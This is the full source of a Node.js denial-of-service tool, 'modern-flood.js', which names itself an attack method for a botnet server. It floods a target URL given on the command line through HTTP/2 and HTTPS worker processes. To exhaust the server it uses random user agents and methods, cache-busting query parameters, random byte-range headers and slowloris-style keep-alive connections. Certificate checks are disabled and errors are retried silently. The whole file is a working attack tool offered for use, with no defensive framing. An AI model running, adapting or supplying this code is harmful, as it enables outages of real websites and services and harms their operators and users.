/**
 * MODERN-FLOOD - Advanced HTTP/2 & HTTP/3 Attack Method
 * Uses modern web vulnerabilities and techniques
 * Compatible with the botnet server
 * 
 * Usage: node modern-flood.js <target> <duration> <threads> <rate_limit>
 */

const http2 = require('http2');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');

// Parse command line arguments
const args = process.argv.slice(2);
if (args.length < 2) {
    console.log('Usage: node modern-flood.js <target> <duration> [threads] [rate_limit]');
    process.exit(1);
}

const TARGET = args[0];
const DURATION = parseInt(args[1]) || 60;
const THREADS = parseInt(args[2]) || Math.min(os.cpus().length, 4);
const RATE_LIMIT = parseInt(args[3]) || 64;

// Attack configuration
const CONFIG = {
    target: TARGET,
    duration: DURATION,
    threads: THREADS,
    rateLimit: RATE_LIMIT,
    userAgents: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
    ],
    methods: ['GET', 'POST', 'HEAD', 'OPTIONS'],
    vulnerabilities: {
        slowloris: true,          // Keep connections open
        rangeAttack: true,         // Byte range requests
        cacheBypass: true,         // Cache poisoning
        http2Flood: true,          // HTTP/2 stream multiplexing
        compressionBomb: true      // Request large compressed responses
    }
};

// Parse target URL
let targetUrl;
try {
    targetUrl = new URL(CONFIG.target);
} catch (error) {
    console.error('[ERROR] Invalid target URL:', CONFIG.target);
    process.exit(1);
}

// Generate random string
function randomString(length = 16) {
    return crypto.randomBytes(length).toString('hex');
}

// Generate random user agent
function randomUserAgent() {
    return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
}

// Generate random HTTP method
function randomMethod() {
    return CONFIG.methods[Math.floor(Math.random() * CONFIG.methods.length)];
}

// Generate cache-busting query parameters
function generateCacheBuster() {
    return {
        _: Date.now(),
        rand: randomString(8),
        cb: crypto.randomBytes(4).toString('hex'),
        t: Math.random().toString(36).substring(7)
    };
}

// Build query string
function buildQueryString(params) {
    return Object.entries(params)
        .map(([key, value]) => `${key}=${value}`)
        .join('&');
}

// HTTP/2 Attack
function http2Attack() {
    const client = http2.connect(targetUrl.origin, {
        rejectUnauthorized: false
    });

    client.on('error', () => {
        client.close();
        setTimeout(() => http2Attack(), 100);
    });

    const attackInterval = setInterval(() => {
        for (let i = 0; i < CONFIG.rateLimit; i++) {
            const cacheBuster = generateCacheBuster();
            const path = `${targetUrl.pathname}?${buildQueryString(cacheBuster)}`;
            
            const headers = {
                ':method': randomMethod(),
                ':path': path,
                'user-agent': randomUserAgent(),
                'accept': '*/*',
                'accept-encoding': CONFIG.vulnerabilities.compressionBomb ? 'gzip, deflate, br, compress' : 'identity',
                'cache-control': CONFIG.vulnerabilities.cacheBypass ? 'no-cache, no-store, must-revalidate' : 'max-age=0',
                'pragma': 'no-cache',
                'connection': CONFIG.vulnerabilities.slowloris ? 'keep-alive' : 'close',
                'x-requested-with': 'XMLHttpRequest',
                'origin': targetUrl.origin,
                'referer': targetUrl.href
            };

            // Add range header for range attack
            if (CONFIG.vulnerabilities.rangeAttack && Math.random() > 0.5) {
                const rangeStart = Math.floor(Math.random() * 1000000);
                headers['range'] = `bytes=${rangeStart}-${rangeStart + Math.floor(Math.random() * 100000)}`;
            }

            const req = client.request(headers);
            
            req.on('error', () => {});
            req.end();

            // Keep connection open for slowloris
            if (!CONFIG.vulnerabilities.slowloris) {
                req.close();
            }
        }
    }, 1000);

    setTimeout(() => {
        clearInterval(attackInterval);
        client.close();
    }, CONFIG.duration * 1000);
}

// HTTPS/1.1 Fallback Attack
function httpsAttack() {
    const makeRequest = () => {
        const cacheBuster = generateCacheBuster();
        const path = `${targetUrl.pathname}?${buildQueryString(cacheBuster)}`;

        const options = {
            hostname: targetUrl.hostname,
            port: targetUrl.port || 443,
            path: path,
            method: randomMethod(),
            headers: {
                'User-Agent': randomUserAgent(),
                'Accept': '*/*',
                'Accept-Encoding': CONFIG.vulnerabilities.compressionBomb ? 'gzip, deflate, br' : 'identity',
                'Cache-Control': CONFIG.vulnerabilities.cacheBypass ? 'no-cache, no-store' : 'max-age=0',
                'Connection': CONFIG.vulnerabilities.slowloris ? 'keep-alive' : 'close',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': targetUrl.href
            },
            rejectUnauthorized: false
        };

        // Add range header
        if (CONFIG.vulnerabilities.rangeAttack && Math.random() > 0.5) {
            const rangeStart = Math.floor(Math.random() * 1000000);
            options.headers['Range'] = `bytes=${rangeStart}-${rangeStart + Math.floor(Math.random() * 100000)}`;
        }

        const req = https.request(options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', () => {});
        req.end();
    };

    const attackInterval = setInterval(() => {
        for (let i = 0; i < CONFIG.rateLimit; i++) {
            makeRequest();
        }
    }, 1000);

    setTimeout(() => {
        clearInterval(attackInterval);
    }, CONFIG.duration * 1000);
}

// Master process
if (cluster.isMaster) {
    console.log('\n╔════════════════════════════════════════╗');
    console.log('║      MODERN-FLOOD ATTACK METHOD       ║');
    console.log('╚════════════════════════════════════════╝\n');
    console.log(`Target       : ${CONFIG.target}`);
    console.log(`Duration     : ${CONFIG.duration} seconds`);
    console.log(`Threads      : ${CONFIG.threads}`);
    console.log(`Rate/Thread  : ${CONFIG.rateLimit} req/s`);
    console.log(`Total Rate   : ~${CONFIG.threads * CONFIG.rateLimit} req/s`);
    console.log('\nVulnerabilities Exploited:');
    console.log(`  • HTTP/2 Flood         : ${CONFIG.vulnerabilities.http2Flood ? '✓' : '✗'}`);
    console.log(`  • Slowloris            : ${CONFIG.vulnerabilities.slowloris ? '✓' : '✗'}`);
    console.log(`  • Range Attack         : ${CONFIG.vulnerabilities.rangeAttack ? '✓' : '✗'}`);
    console.log(`  • Cache Bypass         : ${CONFIG.vulnerabilities.cacheBypass ? '✓' : '✗'}`);
    console.log(`  • Compression Bomb     : ${CONFIG.vulnerabilities.compressionBomb ? '✓' : '✗'}`);
    console.log('\n[INFO] Launching attack...\n');

    // Fork worker processes
    for (let i = 0; i < CONFIG.threads; i++) {
        const worker = cluster.fork();
        console.log(`[THREAD-${i + 1}] Started (PID: ${worker.process.pid})`);
    }

    // Auto-stop after duration
    setTimeout(() => {
        console.log('\n[INFO] Attack duration reached. Stopping all threads...');
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[COMPLETE] Attack finished successfully.\n');
        process.exit(0);
    }, CONFIG.duration * 1000 + 2000);

    cluster.on('exit', (worker, code, signal) => {
        console.log(`[THREAD] Worker ${worker.process.pid} exited`);
    });

} else {
    // Worker process
    try {
        // Try HTTP/2 first, fallback to HTTPS
        if (CONFIG.vulnerabilities.http2Flood && targetUrl.protocol === 'https:') {
            http2Attack();
        } else {
            httpsAttack();
        }
    } catch (error) {
        console.error(`[WORKER-${process.pid}] Error:`, error.message);
        httpsAttack(); // Fallback
    }
}

// Handle process termination
process.on('SIGTERM', () => {
    console.log('[INFO] Received SIGTERM, shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('\n[INFO] Received SIGINT, shutting down gracefully...');
    process.exit(0);
});
